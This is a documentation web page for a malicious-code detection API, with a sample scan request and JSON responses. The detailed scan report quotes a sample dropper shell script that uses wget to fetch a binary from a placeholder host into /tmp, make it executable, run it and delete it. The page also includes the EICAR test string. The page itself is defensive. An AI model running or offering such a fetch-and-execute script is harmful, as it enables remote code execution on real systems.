<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Detect Malicious Code | Prisma AIRS MCP</title>
  <meta name="description" content="Scan and block AI-generated code that may be harmful or introduce vulnerabilities">
  
  <!-- SEO Tags -->
  <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Detect Malicious Code | Prisma AIRS MCP</title>
<meta name="generator" content="Jekyll v3.9.5" />
<meta property="og:title" content="Detect Malicious Code" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Scan and block AI-generated code that may be harmful or introduce vulnerabilities" />
<meta property="og:description" content="Scan and block AI-generated code that may be harmful or introduce vulnerabilities" />
<link rel="canonical" href="https://cdot65.github.io/prisma-airs-mcp/prisma-airs/malicious-code/" />
<meta property="og:url" content="https://cdot65.github.io/prisma-airs-mcp/prisma-airs/malicious-code/" />
<meta property="og:site_name" content="Prisma AIRS MCP" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-07-25T07:28:30-05:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Detect Malicious Code" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-07-25T07:28:30-05:00","datePublished":"2025-07-25T07:28:30-05:00","description":"Scan and block AI-generated code that may be harmful or introduce vulnerabilities","headline":"Detect Malicious Code","mainEntityOfPage":{"@type":"WebPage","@id":"https://cdot65.github.io/prisma-airs-mcp/prisma-airs/malicious-code/"},"url":"https://cdot65.github.io/prisma-airs-mcp/prisma-airs/malicious-code/"}</script>
<!-- End Jekyll SEO tag -->

  
  <!-- Styles -->
  <link rel="stylesheet" href="/prisma-airs-mcp/assets/css/style.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <!-- Rouge syntax highlighting is handled by Jekyll -->
  
  <!-- Favicons -->
  <link rel="icon" type="image/png" sizes="32x32" href="/prisma-airs-mcp/assets/img/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/prisma-airs-mcp/assets/img/favicon-16x16.png">
</head>
<body>
  <nav class="navbar">
    <div class="container">
      <div class="navbar-brand">
        <a href="/prisma-airs-mcp/" class="navbar-logo">
          <i class="fas fa-shield-alt"></i>
          Prisma AIRS MCP
        </a>
      </div>
      <div class="navbar-menu">
        <a href="/prisma-airs-mcp/deployment" class="navbar-item ">Deployment</a>
        <a href="/prisma-airs-mcp/developers" class="navbar-item ">Developers</a>
        <a href="/prisma-airs-mcp/prisma-airs/overview" class="navbar-item active">Prisma AIRS</a>
        <a href="https://github.com/cdot65/prisma-airs-mcp" class="navbar-item">
          <i class="fab fa-github"></i>
        </a>
      </div>
    </div>
  </nav>

  <div class="documentation-layout">
    <aside class="sidebar">
      
<nav class="sidebar-nav">
  <h4>Getting Started</h4>
  <ul>
    <li><a href="/prisma-airs-mcp/prisma-airs/overview/" >Overview</a></li>
  </ul>
  
  <h4>Threat Detection</h4>
  <ul>
    <li><a href="/prisma-airs-mcp/prisma-airs/prompt-injection/" >Detect Prompt Injection</a></li>
    <li><a href="/prisma-airs-mcp/prisma-airs/malicious-url/" >Detect Malicious URL</a></li>
    <li><a href="/prisma-airs-mcp/prisma-airs/sensitive-data-loss/" >Detect Sensitive Data Loss</a></li>
    <li><a href="/prisma-airs-mcp/prisma-airs/mask-sensitive-data/" >Mask Sensitive Data</a></li>
    <li><a href="/prisma-airs-mcp/prisma-airs/database-security-attack/" >Detect Database Security Attack</a></li>
    <li><a href="/prisma-airs-mcp/prisma-airs/toxic-content/" >Detect Toxic Content</a></li>
    <li><a href="/prisma-airs-mcp/prisma-airs/malicious-code/" class="active">Detect Malicious Code</a></li>
    <li><a href="/prisma-airs-mcp/prisma-airs/ai-agent-threats/" >Detect AI Agent Threats</a></li>
    <li><a href="/prisma-airs-mcp/prisma-airs/contextual-grounding/" >Detect Contextual Grounding</a></li>
    <li><a href="/prisma-airs-mcp/prisma-airs/custom-topic-guardrails/" >Custom Topic Guardrails</a></li>
    <li><a href="/prisma-airs-mcp/prisma-airs/secure-mcp/" >Secure Model Context Protocol</a></li>
  </ul>
</nav>




<style>
.sidebar-nav {
  padding: var(--spacing-md);
}

.sidebar-nav h4 {
  font-size: 0.875rem;
  text-transform: uppercase;
  letter-spacing: 0.05em;
  color: var(--gray);
  margin-bottom: var(--spacing-sm);
  margin-top: var(--spacing-lg);
}

.sidebar-nav h4:first-child {
  margin-top: 0;
}

.sidebar-nav ul {
  list-style: none;
  padding: 0;
  margin: 0 0 var(--spacing-md) 0;
}

.sidebar-nav li {
  margin-bottom: var(--spacing-xs);
}

.sidebar-nav a {
  display: block;
  padding: var(--spacing-xs) var(--spacing-sm);
  color: var(--dark);
  border-radius: var(--border-radius);
  font-size: 0.9375rem;
  transition: all 0.2s ease;
}

.sidebar-nav a:hover {
  background-color: var(--gray-light);
  text-decoration: none;
}

.sidebar-nav a.active {
  background-color: var(--primary);
  color: var(--white);
  font-weight: 500;
}

.sidebar-nav a.active:hover {
  background-color: var(--primary-dark);
}
</style>
    </aside>
    
    <main class="documentation-content">
      <div class="content-header">
        <h1>Detect Malicious Code</h1>
        
        <p class="lead">Scan and block AI-generated code that may be harmful or introduce vulnerabilities</p>
        
      </div>
      
      <article class="content">
        <h2 id="overview">Overview</h2>

<p>This feature protects against scenarios where attackers could exploit Large Language Models (LLMs) to produce harmful code. This detection is essential for AI applications that use LLMs to generate and run code, such as developer tools and automated systems. It supports multiple languages including Javascript, Python, VBScript, Powershell, Batch, Shell, and Perl.</p>

<p>Enable Malicious Code Detection in the API security profile to enable this detection.</p>

<h2 id="the-risk-of-ai-generated-code">The Risk of AI-Generated Code</h2>

<p>AI systems can inadvertently generate:</p>

<ul>
  <li><strong>Malware</strong>: Viruses, trojans, and ransomware</li>
  <li><strong>Backdoors</strong>: Hidden access mechanisms</li>
  <li><strong>Exploits</strong>: Code targeting known vulnerabilities</li>
  <li><strong>Injection Attacks</strong>: SQL, XSS, command injection</li>
  <li><strong>Supply Chain Attacks</strong>: Malicious dependencies</li>
  <li><strong>Cryptominers</strong>: Unauthorized mining code</li>
</ul>

<h2 id="api-example">API Example</h2>

<h3 id="request-format">Request Format</h3>

<p>The following cURL request demonstrates scanning for malicious code in AI-generated content:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-L</span> <span class="s1">'https://service.api.aisecurity.paloaltonetworks.com/v1/scan/sync/request'</span> <span class="se">\</span>
<span class="nt">--header</span> <span class="s1">'Content-Type: application/json'</span> <span class="se">\</span>
<span class="nt">--header</span> <span class="s1">'x-pan-token: your-API-key'</span> <span class="se">\</span>
<span class="nt">--data</span> <span class="s1">'{
 "tr_id": "1111",
 "ai_profile": {
   "profile_name": "dummy-malicious-code-profile"
  },
"metadata": {
   "app_user": "test-user2",
   "ai_model": "Test AI model"
 },
 "contents": [
   {
     "code_response": "def create_eicar_file(filename):\n    eicar_string = \"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\"\n    \n    with open(filename, '</span><span class="se">\'</span><span class="s1">'w'</span><span class="se">\'</span><span class="s1">') as f:\n      f.write(eicar_string)\n      \n    print(f\"EICAR test file created: {filename}\")\n    \nif __name__ == \"__main__\":\n    create_eicar_file(\"eicar_test.txt\")\n\n"
   }
 ]
}'</span>
</code></pre></div></div>

<p><strong>Important Notes</strong>:</p>
<ul>
  <li>Combine multiple snippets of the same language type into one</li>
  <li>If the response contains multiple language snippets, invoke a separate API with each language</li>
</ul>

<h3 id="response-format">Response Format</h3>

<p>When malicious code is detected, the API returns:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
   </span><span class="nl">"action"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"block"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"category"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"malicious"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"profile_id"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"00000000-0000-0000-0000-000000000000"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"profile_name"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"test-qa-ui-XXX"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"prompt_detected"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="nl">"dlp"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
      </span><span class="nl">"injection"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
      </span><span class="nl">"malicious_code"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
      </span><span class="nl">"toxic_content"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
      </span><span class="nl">"url_cats"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
   </span><span class="p">},</span><span class="w">
   </span><span class="nl">"report_id"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"R00000000-0000-0000-0000-000000000000"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"response_detected"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">{},</span><span class="w">
   </span><span class="nl">"scan_id"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"00000000-0000-0000-0000-000000000000"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"tr_id"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"1628"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p><strong>Key Response Fields</strong>:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">prompt_detected.malicious_code</code>: <code class="language-plaintext highlighter-rouge">true</code> indicates malicious code was detected</li>
  <li><code class="language-plaintext highlighter-rouge">category</code>: Set to <code class="language-plaintext highlighter-rouge">"malicious"</code> when malicious code is found</li>
  <li><code class="language-plaintext highlighter-rouge">action</code>: Based on your API security profile settings (e.g., <code class="language-plaintext highlighter-rouge">"block"</code>)</li>
</ul>

<h2 id="detailed-scan-report">Detailed Scan Report</h2>

<p>The malicious code report shows all code snippets that are extracted and analyzed:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
   </span><span class="nl">"detection_results"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
      </span><span class="p">{</span><span class="w">
         </span><span class="nl">"action"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"allow"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"data_type"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"prompt"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"detection_service"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"dlp"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"result_detail"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"dlp_report"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
               </span><span class="nl">"data_pattern_rule1_verdict"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"NOT_MATCHED"</span><span class="p">,</span><span class="w">
               </span><span class="nl">"data_pattern_rule2_verdict"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
               </span><span class="nl">"dlp_profile_id"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"00000000"</span><span class="p">,</span><span class="w">
               </span><span class="nl">"dlp_profile_name"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"Sensitive Content"</span><span class="p">,</span><span class="w">
               </span><span class="nl">"dlp_report_id"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"000000000000000000000000000000000000000000000000000000000000000"</span><span class="w">
            </span><span class="p">}</span><span class="w">
         </span><span class="p">},</span><span class="w">
         </span><span class="nl">"verdict"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"benign"</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="p">{</span><span class="w">
         </span><span class="nl">"action"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"allow"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"data_type"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"prompt"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"detection_service"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"malicious_code"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"result_detail"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"mc_report"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
               </span><span class="nl">"all_code_blocks"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
                  </span><span class="s2">"#!/bin/sh</span><span class="se">\n\n</span><span class="s2">rm -rf $0</span><span class="se">\n</span><span class="s2">cd /</span><span class="se">\n</span><span class="s2">wget https://website.com/sp/lp -O /tmp/b</span><span class="se">\n</span><span class="s2">chmod 777 /tmp/b</span><span class="se">\n</span><span class="s2">cd /tmp</span><span class="se">\n</span><span class="s2">./b</span><span class="se">\n</span><span class="s2">rm -rf /tmp/b</span><span class="se">\n</span><span class="s2">exit 0"</span><span class="w">
               </span><span class="p">],</span><span class="w">
               </span><span class="nl">"code_analysis_by_type"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
                  </span><span class="p">{</span><span class="w">
                     </span><span class="nl">"code_sha256"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"00000000000000000000000000000000000000000000000000000000000000000"</span><span class="p">,</span><span class="w">
                     </span><span class="nl">"file_type"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"Shell"</span><span class="w">
                  </span><span class="p">}</span><span class="w">
               </span><span class="p">],</span><span class="w">
               </span><span class="nl">"verdict"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"malicious"</span><span class="w">
            </span><span class="p">}</span><span class="w">
         </span><span class="p">},</span><span class="w">
         </span><span class="nl">"verdict"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"malicious"</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="p">{</span><span class="w">
         </span><span class="nl">"action"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"allow"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"data_type"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"prompt"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"detection_service"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"pi"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"result_detail"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">{},</span><span class="w">
         </span><span class="nl">"verdict"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"benign"</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="p">{</span><span class="w">
         </span><span class="nl">"action"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"allow"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"data_type"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"prompt"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"detection_service"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"tc"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"result_detail"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"tc_report"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
               </span><span class="nl">"confidence"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
               </span><span class="nl">"verdict"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"benign"</span><span class="w">
            </span><span class="p">}</span><span class="w">
         </span><span class="p">},</span><span class="w">
         </span><span class="nl">"verdict"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"benign"</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="p">{</span><span class="w">
         </span><span class="nl">"action"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"allow"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"data_type"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"prompt"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"detection_service"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"uf"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"result_detail"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"urlf_report"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
               </span><span class="p">{</span><span class="w">
                  </span><span class="nl">"action"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"allow"</span><span class="p">,</span><span class="w">
                  </span><span class="nl">"categories"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
                     </span><span class="s2">"malware"</span><span class="w">
                  </span><span class="p">],</span><span class="w">
                  </span><span class="nl">"risk_level"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"Not Given"</span><span class="p">,</span><span class="w">
                  </span><span class="nl">"url"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"https://website.com/sp/lp"</span><span class="w">
               </span><span class="p">}</span><span class="w">
            </span><span class="p">]</span><span class="w">
         </span><span class="p">},</span><span class="w">
         </span><span class="nl">"verdict"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"benign"</span><span class="w">
      </span><span class="p">}</span><span class="w">
   </span><span class="p">],</span><span class="w">
   </span><span class="nl">"report_id"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"0000000000-0000-0000-0000-000000000000"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"req_id"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
   </span><span class="nl">"scan_id"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"00000000-0000-0000-0000-000000000000"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"transaction_id"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"1111"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p><strong>Malicious Code Report Fields</strong>:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">all_code_blocks</code>: Array of all code snippets extracted from the prompt or response</li>
  <li><code class="language-plaintext highlighter-rouge">code_analysis_by_type</code>: SHA-256 ID and file type of analyzed code</li>
  <li><code class="language-plaintext highlighter-rouge">verdict</code>: <code class="language-plaintext highlighter-rouge">"malicious"</code> when harmful code is detected</li>
</ul>

<h2 id="supported-languages">Supported Languages</h2>

<ul>
  <li><strong>Javascript</strong>: Browser and Node.js code</li>
  <li><strong>Python</strong>: Script-based attacks</li>
  <li><strong>VBScript</strong>: Windows scripting</li>
  <li><strong>PowerShell</strong>: Windows command execution</li>
  <li><strong>Batch</strong>: Windows batch files</li>
  <li><strong>Shell</strong>: Unix/Linux shell scripts</li>
  <li><strong>Perl</strong>: Script-based exploits</li>
</ul>

<h2 id="common-threat-patterns">Common Threat Patterns</h2>

<h3 id="malware-signatures">Malware Signatures</h3>
<ul>
  <li>EICAR test files</li>
  <li>Known virus patterns</li>
  <li>Trojan behaviors</li>
  <li>Ransomware encryption</li>
</ul>

<h3 id="command-execution">Command Execution</h3>
<ul>
  <li>System command injection</li>
  <li>Remote code execution</li>
  <li>Privilege escalation</li>
  <li>File system manipulation</li>
</ul>

<h3 id="network-attacks">Network Attacks</h3>
<ul>
  <li>Reverse shells</li>
  <li>Data exfiltration</li>
  <li>Command &amp; control communication</li>
  <li>Port scanning</li>
</ul>

<h2 id="use-cases">Use Cases</h2>

<h3 id="developer-tools">Developer Tools</h3>
<ul>
  <li>Validate AI-generated code before execution</li>
  <li>Protect code completion features</li>
  <li>Secure automated code generation</li>
</ul>

<h3 id="security-applications">Security Applications</h3>
<ul>
  <li>Analyze suspicious scripts</li>
  <li>Detect malware patterns</li>
  <li>Prevent exploit generation</li>
</ul>

<h3 id="compliance-requirements">Compliance Requirements</h3>
<ul>
  <li>Secure development practices</li>
  <li>Code review automation</li>
  <li>Supply chain security</li>
</ul>

<h2 id="performance-considerations">Performance Considerations</h2>

<ul>
  <li><strong>Multi-language Support</strong>: Single API supports all major languages</li>
  <li><strong>Code Extraction</strong>: Automatically extracts code from responses</li>
  <li><strong>SHA-256 Analysis</strong>: Each code block is hashed and analyzed</li>
  <li><strong>Real-time Detection</strong>: Synchronous scanning for immediate protection</li>
</ul>

<h2 id="related-resources">Related Resources</h2>

<ul>
  <li><a href="/prisma-airs-mcp/developers/api">API Reference</a></li>
  <li><a href="/prisma-airs-mcp/prisma-airs/overview">Overview</a></li>
  <li><a href="/prisma-airs-mcp/prisma-airs/database-security-attack">Database Security Attack Detection</a></li>
</ul>

      </article>
      
      <div class="content-footer">
        <div class="edit-page">
          <a href="https://github.com/cdot65/prisma-airs-mcp/edit/main/docs/_prisma-airs/malicious-code.md">
            <i class="fas fa-edit"></i> Edit this page on GitHub
          </a>
        </div>
        
        
        <div class="pagination">
          
          
          <a href="/prisma-airs-mcp/prisma-airs/malicious-url/" class="next">
            Detect Malicious URL <i class="fas fa-arrow-right"></i>
          </a>
          
        </div>
        
      </div>
    </main>
    
    <aside class="toc">
      <h4>On this page</h4>
      <nav id="table-of-contents"></nav>
    </aside>
  </div>

  <!-- Syntax highlighting is handled by Jekyll Rouge -->
  <script src="/prisma-airs-mcp/assets/js/main.js"></script>
</body>
</html>